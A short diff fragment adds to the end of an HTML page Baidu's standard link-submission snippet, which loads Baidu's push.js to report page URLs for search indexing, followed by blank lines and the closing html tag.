+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
